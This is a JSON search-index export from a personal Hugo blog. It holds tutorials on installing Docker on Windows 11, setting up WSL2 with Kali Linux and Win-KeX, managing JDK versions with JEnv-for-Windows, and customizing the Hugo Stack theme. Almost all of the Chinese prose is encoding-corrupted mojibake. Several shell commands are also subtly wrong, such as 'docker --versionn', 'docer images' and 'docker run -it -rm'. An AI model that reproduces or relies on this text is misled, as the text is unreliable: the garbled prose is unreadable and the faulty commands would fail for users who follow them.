â€œå¯åŠ¨æˆ–å…³é—­WindowsåŠŸèƒ½â€ã€‚\nå‹¾é€‰Hyper-VåŠŸèƒ½\nå¹¶å‹¾é€‰ä»¥ä¸‹åŠŸèƒ½\né‡å¯åå®‰è£…Docker åŒå‡»å®‰è£… docker\né»˜è®¤é…ç½®\nç­‰å¾…å®‰è£…ç»“æŸ\nå®‰è£…å®Œæ¯•åï¼Œç‚¹å‡»Close and log out\nç”µè„‘é‡å¯åï¼Œç‚¹å‡»Dockerç¨‹åº\nç°åœ¨ç¨‹åºå°±æ­£å¸¸å¯åŠ¨å•¦\nåŠ é€Ÿ é…ç½®aliyuné•œåƒåŠ é€Ÿ å¦‚æœpullæ“ä½œæ¯”è¾ƒæ…¢ï¼Œæ¥ä¸‹æ¥éœ€è¦é…ç½®ä¸€ä¸‹é•œåƒä»£ç†ï¼Œä¾¿äºæ›´å¿«é€Ÿçš„æ‹‰å–èµ„æºï¼ ç™»å½•aliyunå®˜ç½‘ï¼šã€Šé•œåƒåŠ é€Ÿå™¨ã€‹ ä½¿ç”¨ æŸ¥çœ‹ 1 docker --versionn è·å–é•œåƒ 1 docker pull xxx æŸ¥çœ‹é•œåƒ 1 docer images åˆ é™¤é•œåƒ 1 2 3 4 5 # åˆ é™¤æŒ‡å®šçš„é•œåƒ docker rmi xxx.image # æ¸…ç†æœ¬åœ°çš„Dockeré•œåƒ docker image prune -f å¯åŠ¨å®¹å™¨ ä»¥ä¸‹å‘½ä»¤ä½¿ç”¨xxxé•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œå‚æ•°ä¸ºä»¥å‘½ä»¤æ¨¡å¼è¿›å…¥è¯¥å®¹å™¨ï¼š\n1 docker run -it xxx /bin/bash ä¹Ÿå¯ä»¥ï¼š\n1 docker run -it -rm --entrypoint /bin/bash é•œåƒå æ‰€ä»¥ï¼Œæ›´å¸¸ç”¨çš„æ˜¯è¿™ç§åå°å¯åŠ¨çš„æ–¹å¼:\n1 docker run -itd xxx /bin/bash äº¤äº’å®¹å™¨ è¿è¡Œå®¹å™¨åæ­£å¸¸å¯åŠ¨çŠ¶æ€ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1 2 3 4 5 6 7 8 # å…ˆåœ¨åå°å¯åŠ¨ docker run -itd --entrypoint /bin/bash reqpython # æŸ¥çœ‹åˆšæ‰runçš„å®¹å™¨å å¦‚ï¼štest docker ps # å†è¿›å…¥å®¹å™¨å†…éƒ¨ docker exec -it test /bin/bash åªæ˜¯åšæµ‹è¯•ç”¨ï¼Œæµ‹è¯•å®Œåï¼Œä¸æƒ³ä¿ç•™å®¹å™¨ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1 docker run -it --rm --entrypoint /bin/bash é•œåƒå åˆ é™¤å®¹å™¨ 1 2 3 4 5 # åˆ é™¤å•ä¸ª docker rm -f \u0026lt;å®¹å™¨ID\u0026gt; # æ‰¹é‡åˆ é™¤ docker rm -f \u0026lt;å®¹å™¨ID\u0026gt;1 \u0026lt;å®¹å™¨ID\u0026gt;2 \u0026lt;å®¹å™¨ID\u0026gt;â€¦â€¦ æŸ¥çœ‹å®¹å™¨ 1 docker ps -a å®¹å™¨çš„æš‚åœä¸æ¢å¤ 1 2 3 4 5 # æš‚åœå®¹å™¨çš„è¿è¡Œï¼Œä½†æ˜¯å®¹å™¨å¹¶æ²¡æœ‰è¿è¡Œ docker pause \u0026lt;å®¹å™¨ID\u0026gt; # æ¢å¤å®¹å™¨çš„æš‚åœ docker unpause \u0026lt;å®¹å™¨ID\u0026gt; å®¹å™¨çš„åœæ­¢ä¸é‡å¯ 1 2 3 4 5 # ä½¿ç”¨æ­¤å‘½ä»¤ä¼šåœæ­¢å®¹å™¨çš„è¿è¡Œ,å¦‚æœæƒ³ä¸åœæ­¢è¿è¡Œï¼Œå¯ä»¥ä½¿ç”¨æš‚åœçš„å‘½ä»¤ã€‚ docker stop \u0026lt;å®¹å™¨ID\u0026gt; # é‡å¯å®¹å™¨ docker restart \u0026lt;å®¹å™¨ID\u0026gt; è¿›å…¥å®¹å™¨ å…ˆæŸ¥çœ‹å®¹å™¨çš„åå­— 1 docker ps -a å†ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›å…¥å®¹å™¨ 1 docker exec -it å®¹å™¨çš„åå­— /bin/bash æ›´æ–°å®¹å™¨ æŸ¥çœ‹ç«¯å£æƒ…å†µ æŸ¥çœ‹ç«¯å£å¼€å‘æƒ…å†µ 1 netstat -nlpt æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ 1 2 3 4 5 # æŸ¥çœ‹æ‰€æœ‰ ps aux # æŸ¥çœ‹æŒ‡å®šæœåŠ¡ ps aux | grep docker æŸ¥çœ‹ç«¯å£æ˜ å°„ 1 docker port \u0026lt;å®¹å™¨ID\u0026gt; æŸ¥çœ‹è¿›ç¨‹å·ï¼ˆPIDï¼‰ å…ˆæŸ¥æ‰¾å®¹å™¨ID 1 docker ps -a ä¼ å…¥\u0026lt;å®¹å™¨ID\u0026gt;æŸ¥æ‰¾PID 1 2 3 4 5 docker inspect -f \u0026#39;{{.State.Pid}}\u0026#39; \u0026lt;å®¹å™¨ID\u0026gt; docker container top \u0026lt;å®¹å™¨ID\u0026gt; ps aux | grep \u0026lt;å®¹å™¨ID\u0026gt; è·å–å®¹å™¨å†…éƒ¨æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡çš„å ç”¨å†…å­˜èµ„æºæƒ…å†µ 1 docker stats --no-stream \u0026lt;å®¹å™¨ID\u0026gt; å¤åˆ¶æœ¬åœ°æ–‡ä»¶åˆ°å®¹å™¨å†… 1 docker cp æœ¬åœ°æ–‡ä»¶è·¯å¾„ \u0026lt;å®¹å™¨ID\u0026gt;/\u0026lt;å®¹å™¨å\u0026gt;:å®¹å™¨å†…éƒ¨å­˜æ”¾æ–‡ä»¶ä½ç½® æ‰“åŒ…å®¹å™¨ä¸ºé•œåƒ 1 docker commit \u0026lt;å®¹å™¨ID\u0026gt; \u0026lt;æ‰“åŒ…åçš„é•œåƒå\u0026gt;:\u0026lt;ç‰ˆæœ¬å·\u0026gt; é™„å½• å‚è€ƒæ–‡çŒ® ã€Šã€Dockerã€‘æŒæ¡ Dockeré­”æ³•ï¼šWindows 11 å¹³å°ä¸Šçš„å®Œç¾å®¹å™¨éƒ¨ç½²ç»ˆææŒ‡å—ã€‹\nç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-08T21:43:41+08:00","image":"http://ranch007.github.io/p/%E6%8E%8C%E6%8F%A1-docker%E9%AD%94%E6%B3%95windows-11-%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%9A%84%E5%AE%8C%E7%BE%8E%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/docker_hu12023594874665799484.png","permalink":"http://ranch007.github.io/p/%E6%8E%8C%E6%8F%A1-docker%E9%AD%94%E6%B3%95windows-11-%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%9A%84%E5%AE%8C%E7%BE%8E%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/","title":"æŒæ¡ Dockeré­”æ³•ï¼šWindows 11 å¹³å°ä¸Šçš„å®Œç¾å®¹å™¨éƒ¨ç½²ç»ˆææŒ‡å—"},{"content":" å‰ç½®æ¡ä»¶ CPU è™šæ‹ŸåŒ– ä¿®æ”¹BIOSè®¾ç½®ï¼ˆVMX/AMD-vï¼‰ windows åŠŸèƒ½ é€‚ç”¨äºLinuxçš„windowså­ç³»ç»Ÿ è™šæ‹Ÿæœºå¹³å° å®‰è£… é»˜è®¤ ubuntu å‘è¡Œç‰ˆ ç®¡ç†å‘˜æƒé™æ‰“å¼€ cmd\n1 wsl --install kali-linux --web-download æŸ¥çœ‹åœ¨çº¿å‘è¡Œç‰ˆ 1 wsl --list --online æŸ¥çœ‹å®‰è£…çš„å­ç³»ç»Ÿ 1 wsl --list -v å¦‚æœ windowsä¸‹ sublinux å®‰è£…å‡ºç°â€œä¸èƒ½è®¿é—®ç½‘ç»œä½ç½®+æœ‰å…³ç½‘ç»œæ’é™¤æ•…éšœçš„ä¿¡æ¯â€\n1 2 3 4 netsh winsock reset netsh int ip reset all netsh winhttp reset proxy ipconfig /flushdns ä½¿ç”¨ åˆ‡æ¢é»˜è®¤å­ç³»ç»Ÿ 1 wsl --set-default xxx å¯åŠ¨æŒ‡å®šçš„å­ç³»ç»Ÿ 1 wsl -d kali-linux å¸è½½ 1 wsl --unregister kali-linux å¤‡ä»½ 1 2 3 4 5 # å¯¼å‡º wsl --export kali-linux kali.tar # å¯¼å…¥ wsl --import kali2 D:/wsl C:\\Users\\admin\\Desktop kali æ‰“å¼€æ¡Œé¢çª—å£ wsl2 é»‘ç§‘æŠ€ WSLg å…è®¸ Linux é‡Œé¢å¸¦æœ‰UIçš„åº”ç”¨ç¨‹åºï¼Œç›´æ¥ä»¥ Windows çª—å£çš„å½¢å¼æ‰“å¼€\næ˜¾å¡ç›´é€š 1 2 # æŸ¥çœ‹æ˜¾å¡ nvidia-smi é•œåƒç½‘ç»œæ¨¡å¼ åœ¨ C:\\Users\\xxx ä¸‹é¢åˆ›å»º .wslconfig æ–‡ä»¶\n1 2 [wsl2] networkingMode = mirrored ç„¶åä¿å­˜ï¼Œä½¿ç”¨ wsl --shutdown å…³é—­è™šæ‹Ÿæœºï¼Œç­‰ 8 ç§’ã€‚\nkali å®‰è£… Win-Kex å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼šã€Win-Kexä¸ºKali Linuxæä¾›GUIæ¡Œé¢ä½“éªŒã€‘\nwin-kexæ”¯æŒä»¥ä¸‹ä¸‰ç§æ¨¡å¼\nçª—å£æ¨¡å¼ è¦åœ¨æ”¯æŒå£°éŸ³çš„ Window æ¨¡å¼ä¸‹å¯åŠ¨ Win-KeXï¼Œè¯·è¿è¡Œä»¥ä¸‹ä»»ä¸€å‘½ä»¤ï¼š\nKali WSL å†…éƒ¨ï¼škex --win -s åœ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ä¸Šï¼šwsl -d kali-linux kex --win -s æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ã€ Win-KeX çª—å£æ¨¡å¼ä½¿ç”¨æ–‡æ¡£ã€‘ã€‚\nå¢å¼ºçš„ä¼šè¯æ¨¡å¼ è¦åœ¨å…·æœ‰å£°éŸ³æ”¯æŒå’Œ ARM è§£å†³æ–¹æ³•çš„å¢å¼ºä¼šè¯æ¨¡å¼ä¸‹å¯åŠ¨ Win-KeX\nè¯·è¿è¡Œä»¥ä¸‹ä»»ä¸€å‘½ä»¤ï¼š\nKali WSL å†…éƒ¨ï¼škex --esm --ip -s åœ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ä¸Šï¼šwsl -d kali-linux kex --esm --ip -s æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ã€ Win-KeX å¢å¼ºå‹ä¼šè¯æ¨¡å¼ä½¿ç”¨æ–‡æ¡£ã€‘ã€‚\næ— ç¼æ¨¡å¼ ä½¿ç”¨æ— ç¼æ¨¡å¼ï¼ˆwin-kex SLï¼‰ï¼Œè¯·åœ¨WSLè®¾ç½®é‡Œï¼Œå°†ç½‘ç»œæ¨¡å¼æ›´æ”¹ä¸ºNAT\nè¿›å…¥kaliç³»ç»Ÿï¼Œä¿®æ”¹/etc/resolv.confæ–‡ä»¶é‡Œçš„nameserverï¼Œå…¶IPåœ°å€ä¸windowsä¸­vEthernet (WSL (Hyper-V firewall))IPåœ°å€ä¸€è‡´ã€‚\nè¦åœ¨å…·æœ‰å£°éŸ³æ”¯æŒçš„æ— ç¼æ¨¡å¼ä¸‹å¯åŠ¨ Win-KeXï¼Œè¯·è¿è¡Œï¼Œè¿è¡Œä»¥ä¸‹ä»»ä¸€ï¼š\nKali WSL å†…éƒ¨ï¼škex --sl -s åœ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ä¸Šï¼šwsl -d kali-linux kex --sl -s æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ã€ Win-KeX SL ä½¿ç”¨æ–‡æ¡£ã€‘ã€‚\né™„å½• å‚è€ƒæ–‡çŒ® ã€ŠWSL2 + linuxé…ç½®æµç¨‹è¶…è¯¦ç»†æŒ‡å— | mednight4ã€‹\nç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-02T21:54:21+08:00","image":"http://ranch007.github.io/p/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84wsl2%E6%95%99%E7%A8%8Bwindows%E4%B8%8A%E7%9A%84linux%E5%AD%90%E7%B3%BB%E7%BB%9F/wsl_hu2516149183884693131.png","permalink":"http://ranch007.github.io/p/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84wsl2%E6%95%99%E7%A8%8Bwindows%E4%B8%8A%E7%9A%84linux%E5%AD%90%E7%B3%BB%E7%BB%9F/","title":"è¶…è¯¦ç»†çš„wsl2æ•™ç¨‹ï¼šwindowsä¸Šçš„linuxå­ç³»ç»Ÿ"},{"content":" JEnv ä»‹ç» ã€JEnv-for-Windowsã€‘æ˜¯ä¸€ä¸ªä¸“ä¸ºWindowsç³»ç»Ÿè®¾è®¡çš„å¼€æºå·¥å…·ï¼Œç”±FelixSelterå¼€å‘ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯è®©å¼€å‘è€…èƒ½å¤Ÿè½»æ¾åœ°åœ¨ä¸åŒç‰ˆæœ¬çš„Javaå¼€å‘å·¥å…·åŒ…ï¼ˆJDKï¼‰ä¹‹é—´è¿›è¡Œåˆ‡æ¢ã€‚\nå…³é”®æŠ€æœ¯å’Œæ¡†æ¶ æ‰¹å¤„ç†è„šæœ¬ï¼šç”¨äºåˆ›å»ºå¿«æ·çš„Javaç‰ˆæœ¬åˆ‡æ¢é€»è¾‘ï¼› PowerShellè„šæœ¬ï¼šç”¨äºç¯å¢ƒå˜é‡çš„åŠ¨æ€ç®¡ç†ï¼Œå…¼å®¹æ€§å¢å¼ºï¼Œä»¥åŠæ›´é«˜çº§çš„æ“ä½œï¼› æ— éœ€é¢å¤–ä¾èµ–ï¼šç›´æ¥é€šè¿‡ç¯å¢ƒå˜é‡å’Œè„šæœ¬æ“ä½œæ¥å®ç°JDKç‰ˆæœ¬çš„ç®¡ç†ã€‚ è¿™æ˜¯å¦‚ä½•è¿ä½œçš„å‘¢ï¼Ÿ å‡†å¤‡å·¥ä½œå’Œè¯¦ç»†å®‰è£…æ­¥éª¤ æ­¥éª¤ä¸€ï¼šä¸‹è½½JDKå¹¶é…ç½® å®‰è£… JDK jdk-1.8 æ­£å¸¸ä¸€æ­¥ä¸€æ­¥å®‰è£…ã€jdk-8u421-windows-x64.exeã€‘\njdk-xxx å°†å…¶ä»–ç‰ˆæœ¬jdkçš„.zipå‹ç¼©åŒ…è§£å‹åˆ°å¯¹åº”æ–‡ä»¶å¤¹\næœ€ç»ˆç›®å½•ç»“æ„å¯å‚è€ƒï¼š é…ç½®ç¯å¢ƒå˜é‡ â‘ æ–°å»ºç³»ç»Ÿå˜é‡JAVA_HOMEï¼Œè·¯å¾„ä¸ºjdk8è·¯å¾„\nâ‘¡æ–°å»ºç³»ç»Ÿå˜é‡CLASSPATHï¼ŒæŒ‡å®šç±»æœç´¢è·¯å¾„\nâ‘¢ç³»ç»Ÿå˜é‡Pathä¸­æ·»åŠ å¯¹åº”è·¯å¾„\næ­¥éª¤äºŒï¼šJEnv-for-Windowsé¡¹ç›®è·å– ä»GitHubå…‹éš†è¯¥ä»“åº“åˆ°æœ¬åœ°å¯¹åº”æ–‡ä»¶å¤¹\n1 git clone https://github.com/FelixSelter/JEnv-for-Windows.git æ­¥éª¤ä¸‰ï¼šJEnvç¯å¢ƒå‡†å¤‡ åˆ é™¤æ—§çš„JAVA_HOME æ·»åŠ JEnvåˆ°ç³»ç»Ÿè·¯å¾„ å°†åˆšå…‹éš†çš„é¡¹ç›®è·¯å¾„æ·»åŠ åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡Pathä¸­ï¼Œç¡®ä¿å¯ä»¥ä»ä»»ä½•åœ°æ–¹è°ƒç”¨jenv.batè„šæœ¬ã€‚\næ­¥éª¤å››ï¼šåˆå§‹åŒ–ä¸é…ç½® é¦–æ¬¡è¿è¡ŒJEnv 1 jenv -help æ·»åŠ JAVAç¯å¢ƒ æ¥ä¸‹æ¥ï¼Œå°†å…¶ä»–ç‰ˆæœ¬jdkæ·»åŠ åˆ°JEnvç®¡ç†ä¸­\n1 2 jenv add jkd8 C:\\Environment\\Java\\jdk-1.8 jenv add jdk17 C:\\Environment\\Java\\jdk-17.0.12 æ­¥éª¤äº”ï¼šéªŒè¯ åˆ—å‡ºjenvç®¡ç†çš„æ‰€æœ‰jdkç‰ˆæœ¬ï¼š\n1 jenv list ç”¨å‘½ä»¤åˆ‡æ¢jdkç‰ˆæœ¬ï¼š\n1 jenv use {name} æ—¥å¸¸æ“ä½œåŠä½¿ç”¨æ–¹æ³• æ·»åŠ æ–°çš„Javaç¯å¢ƒï¼ˆéœ€è¦ç»å¯¹è·¯å¾„ï¼‰\njenv add\u0026lt;name\u0026gt; \u0026lt;path\u0026gt;\nç¤ºä¾‹ï¼šjenv add jdk15 D:\\Programme\\Java\\jdk-15.0.1\næ›´æ”¹å½“å‰ä¼šè¯çš„ java ç‰ˆæœ¬\njenv use\u0026lt;name\u0026gt;\nç¤ºä¾‹ï¼šjenv use jdk15\nè„šæœ¬ç¼–å†™çš„ç¯å¢ƒå˜é‡ï¼š\n\u0026mdash;PowerShell: $ENV:JENVUSE=\u0026quot;jdk17\u0026quot;\n\u0026mdash;CMD/BATCH:set \u0026quot;JENVUSE=jdk17\u0026quot;\næ¸…é™¤å½“å‰ä¼šè¯çš„ java ç‰ˆæœ¬\njenv use remove\nç¤ºä¾‹ï¼šjenv use remove\nç”¨äºè„šæœ¬ç¼–å†™çš„ç¯å¢ƒå˜é‡ï¼š\n\u0026mdash;PowerShell: $ENV:JENVUSE=$null\n\u0026mdash;CMD/BATCH:set \u0026quot;JENVUSE=\u0026quot;\nå…¨å±€æ›´æ”¹æ‚¨çš„ java ç‰ˆæœ¬\njenv change\u0026lt;name\u0026gt;\nç¤ºä¾‹ï¼šjenv change jdk15\nå§‹ç»ˆåœ¨æ­¤æ–‡ä»¶å¤¹\njenv local\u0026lt;name\u0026gt;\nä¸­ä½¿ç”¨æ­¤ java ç‰ˆæœ¬ ç¤ºä¾‹ï¼šjenv local jdk15\næ¸…é™¤æ­¤æ–‡ä»¶å¤¹çš„ java ç‰ˆæœ¬\njenv local remove\nç¤ºä¾‹ï¼šjenv local remove\nåˆ—å‡ºæ‰€æœ‰ Java ç¯å¢ƒ\njenv list\nç¤ºä¾‹ï¼šjenv list\nä» JEnv åˆ—è¡¨ä¸­åˆ é™¤ç°æœ‰çš„ JDK\njenv remove\u0026lt;name\u0026gt;\nç¤ºä¾‹ï¼šjenv remove jdk15\nå…è®¸ä½¿ç”¨ä½äº java ç›®å½•\njenv link\u0026lt;Executable name\u0026gt;\nä¸­çš„ javacã€javaw æˆ–å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶ ç¤ºä¾‹ï¼šjenv link javac\nå¸è½½ jenv å¹¶è‡ªåŠ¨æ¢å¤æ‚¨é€‰æ‹©çš„ Java ç‰ˆæœ¬\njenv uninstall\u0026lt;name\u0026gt;\nç¤ºä¾‹ï¼šjenv uninstall jdk17\nè‡ªåŠ¨æœç´¢è¦æ·»åŠ çš„ java ç‰ˆæœ¬\njenv autoscan [\u0026ndash;yes|-y]?\u0026lt;path\u0026gt;?\nç¤ºä¾‹ï¼šjenv autoscan \u0026quot;C:\\Program Files\\Java\u0026quot;\nç¤ºä¾‹ï¼šjenv autoscan// å°†æœç´¢æ•´ä¸ªç³»ç»Ÿ ç¤ºä¾‹ï¼šjenv autoscan -y \u0026quot;C:\\Program Files\\Java\u0026quot;// å°†æ¥å—é»˜è®¤å€¼\né™„å½• å‚è€ƒæ–‡çŒ® JEnv-for-Windows å®‰è£…ä¸é…ç½®å®Œå…¨æŒ‡å— ç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-10-22T19:37:09+08:00","image":"http://ranch007.github.io/p/jenv-for-windows-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/jenv-for-windows_hu11298204453850082782.png","permalink":"http://ranch007.github.io/p/jenv-for-windows-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/","title":"Win11ä½¿ç”¨JEnvç®¡ç†å¤šç‰ˆæœ¬jdk"},{"content":" [!TIP]\né¿å…è¸©å‘çš„å»ºè®®ï¼š\nå‡¡æ˜¯éœ€è¦æ›´æ”¹çš„æ–‡ä»¶éƒ½ä»themes/ä¸»é¢˜å¤åˆ¶åˆ°ä¸»ç›®å½•ï¼ˆhugo new site xxxåˆ›å»ºçš„é‚£ä¸ªï¼‰ä¸‹\næ¥ä¸‹æ¥çš„ä¸ªæ€§åŒ–é…ç½®æ–‡ä»¶å»ºè®®éƒ½åœ¨åšå®¢ä¸»ç›®å½•ä¸‹æ“ä½œï¼Œå‡å°‘æ›´æ–°ä¸»é¢˜æ—¶ä¸ªæ€§åŒ–é…ç½®è¢«è¦†ç›–çš„éº»çƒ¦\næ¯æ¬¡æœåŠ¡å¯åŠ¨ï¼Œä¼šåŒæ­¥æ›´æ–°æ‰€æœ‰ä½ç½®é…ç½®æ–‡ä»¶ï¼Œä½†ä¸»ç›®å½•é…ç½®æ–‡ä»¶ä¼˜å…ˆçº§æœ€é«˜\nå¯¼å…¥ä¸»é¢˜ å®‰è£…ä¸»é¢˜ä¸€èˆ¬è€Œè¨€å­˜åœ¨ä¸‰ç§æ–¹å¼ï¼š\ngit submodule å®‰è£… go module å®‰è£…ï¼ˆéœ€è¦å®‰è£… Go è¯­è¨€ï¼‰ æœ¬åœ°å®‰è£… â€‹\tæˆ‘ä¸ªäººæ›´æ¨èç¬¬ä¸€ç§æ–¹å¼ï¼Œè€ƒè™‘åˆ°åç»­å‡çº§çš„éš¾æ˜“ï¼Œè¿™ç®—æ˜¯æœ€å‡è¡¡çš„ä¸€ç§æ–¹å¼ã€‚å…·ä½“çš„å®‰è£…æ–¹æ³•å¯ä»¥åœ¨å„ä¸»é¢˜çš„è¯´æ˜ä¸­æ‰¾åˆ°ï¼Œæˆ‘è¿™é‡Œå®‰è£…çš„æ˜¯ã€Stackã€‘ã€‚ åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œè¾“å…¥ï¼š\n1 2 3 4 5 git submodule add https://github.com/CaiJimmy/hugo-theme-stack/ hugo-theme-stack # æ›´æ–°ä¸»é¢˜ git submodule init\t//åˆå§‹åŒ–å­æ¨¡å— git submodule update\t//æ›´æ–°å­æ¨¡å—åˆ°æœ€æ–°ç‰ˆæœ¬ â€‹\tç­‰å¾…ä¸‹è½½å®Œæˆåï¼Œä¾¿å¯ä»¥è¿›è¡Œã€é…ç½®ã€‘äº†ã€‚å‡å¦‚ä½ æƒ³ç”¨å…¶ä»–æ–¹å¼å®‰è£…ï¼Œä¹Ÿå¯ä»¥å‚è€ƒã€è¿™é‡Œã€‘ï¼Œè€Œä¸”Stackæœ¬èº«æœ‰å…¨è‹±æ–‡çš„ã€è¯´æ˜æ–‡æ¡£ã€‘ã€‚æˆ‘å»ºè®®æ˜¯å°†./themes/hugo-theme-stack/exampleSite/æ–‡ä»¶ä¸‹çš„contentå’Œhugo.yamlç›´æ¥å¤åˆ¶åˆ°åšå®¢ä¸»ç›®å½•ä¸‹ï¼ˆè¿™æ˜¯ä¸€ä¸ªä½œè€…æ”¾çš„ä¾‹å­ï¼Œè¿™é‡Œé¢æœ‰è®¸å¤šæç¤ºï¼‰ï¼Œæ ¹æ®è¯´æ˜ä¸éœ€æ±‚ä¿®æ”¹ï¼Œä¼šå‰©ä¸‹å¾ˆå¤šæ—¶é—´ã€‚\nåŸºç¡€é…ç½® æ‰“å¼€hugo.yaml â€‹\tæœ¬åœ°è°ƒè¯•çš„æ—¶å€™baseurlå¯ä»¥è®¾ç½®ä¸ºhttp://localhost:1313ã€‚è°ƒè¯•å®Œæ¨é€åˆ°GitHubä¸Šï¼Œè®°å¾—æ”¹ä¸ºç½‘ç«™æ ¹ç›®å½•ï¼Œæœ‰ç–‘é—®è¯·å‚è€ƒã€è¿™é‡Œã€‘ã€‚\nç½‘ç«™ iconã€æ—¶é—´æ ¼å¼ã€åšå®¢å¤´åƒ ç½‘ç«™iconå­˜å‚¨è·¯å¾„ï¼š/static/favcion.ico Goè¯­è¨€æ—¶é—´æ ¼å¼ï¼š åšå®¢å¤´åƒå­˜å‚¨è·¯å¾„ï¼š/assets/img/avatar.png faviconã€avatarçš„è·¯å¾„æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤º\nLicenseå’Œç•™è¨€æ¿åŠŸèƒ½ licenseï¼šåšå¥½å…¬å…±ç‰ˆæƒè®¸å¯åè®®å£°æ˜ commentsï¼šè¿›å…¥ã€Giscusã€‘å®˜ç½‘ï¼Œåœ¨çº¿å®‰è£…appï¼Œè¿›å…¥Giscusçš„é…ç½®é¡µé¢ï¼Œæ ¹æ®å®˜æ–¹æç¤ºé…ç½®ç•™è¨€æ¿åŠŸèƒ½ã€‚ è¿™é‡Œæˆ‘ä¹Ÿç»™å‡ºæˆ‘çš„é…ç½®ï¼Œä»…ä¾›å‚è€ƒã€‚Message-Boardsæ˜¯æˆ‘æ–°å»ºçš„ä¸€ä¸ªç•™è¨€æ¿ä¸“å±å­˜æ”¾çš„publicä»“åº“ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 comments: enabled: true provider: giscus giscus: repo: Ranch007/Message-Boards repoID: R_kgDONBh4yw category: Announcements categoryID: DIC_kwDONBh4y84CjbwV mapping: pathname strict: 0 lightTheme: 0 darkTheme: 0 reactionsEnabled: 1 emitMetadata: 0 inputPosition: top lang: zh-CN ç¤¾äº¤åŠŸèƒ½ åŠ å…¥ä¸ªäººç¤¾äº¤å¹³å°çš„é“¾æ¥ iconè·¯å¾„ï¼šåšå®¢ä¸»ç›®å½•çš„/assets/iconsä¸‹ï¼Œæ‰€æœ‰iconéƒ½åœ¨è¿™é‡Œï¼Œéƒ½æ˜¯svgæ–‡ä»¶ã€‚ ä¸»é¢˜é­”æ”¹ æ•´ä½“å¸ƒå±€ ç…§æŠ„Naive Koalaè€å¸ˆçš„æ–‡ç« ã€ŠHugo-theme-Stack é­”æ”¹ç¾åŒ–ã€‹ï¼Œæ–‡ç« å†™çš„å¾ˆç»†å¿ƒä¹Ÿå¾ˆç”¨å¿ƒï¼Œå±äºå–‚é¥­æ•™ç¨‹ã€‚\n[!NOTE]\n1.æ²¡æœ‰ç›®å½•çš„è‡ªå·±åˆ›å»ºä¸€ä¸ªåŒåç›®å½•ï¼Œåˆ‡è®°è¦ä»”ç»†ä¿è¯è¿™äº›å•è¯å‡†ç¡®\n2.ä»£ç çœ‹ä¸æ‡‚æ²¡äº‹ï¼Œè¯»æ–‡ç« å°è¯•ç†è§£ï¼Œçœ‹ä¸€ä¸‹ä½œè€…æ”¹çš„é‚£äº›ä»£ç ï¼Œé‚£å°±æ˜¯å®ç°å˜åŠ¨çš„å…³é”®ç‚¹\nè¿™é‡Œæ¶‰åŠåˆ°å¤åˆ¶çš„æ–‡ä»¶åˆ†åˆ«æœ‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 themes\\hugo-theme-stack\\assets\\scss\\custom.scss å¤åˆ¶åˆ° /assets/scss/custom.scss themes\\hugo-theme-stack\\layouts\\partials\\footer\\custom.html å¤åˆ¶åˆ° /layouts/partials/footer/custom.html themes\\hugo-theme-stack\\assets\\scss\\partials\\sidebar.scss å¤åˆ¶åˆ° /assets/scss/partials/sidebar.scssï¼ˆè¿™é‡Œéœ€è¦ä¸‹è½½ä¸¤ä¸ªiconï¼Œè®°å¾—æ›´æ”¹å¥½æŒ‡å®šå‘½åä¿å­˜åˆ°/assets/iconsï¼›è¿˜æ¶‰åŠåˆ°å»ä»£ç ä¸­æ›´æ”¹ï¼Œä½œè€…æœ‰æä¾›è¡Œæ•°ï¼Œç‰ˆæœ¬ä¸ä¸€æ ·æ‰€ä»¥ä¸ä¸€å®šå‡†ç¡®ï¼Œæ‰€ä»¥å¾—å®¡ä¸€ä¸‹ä»£ç ï¼Œæ³¨æ„ç¼©è¿›ï¼‰ themes\\hugo-theme-stack\\layouts\\partials\\sidebar\\left.html å¤åˆ¶åˆ° /layouts/partials/sidebar/left.html 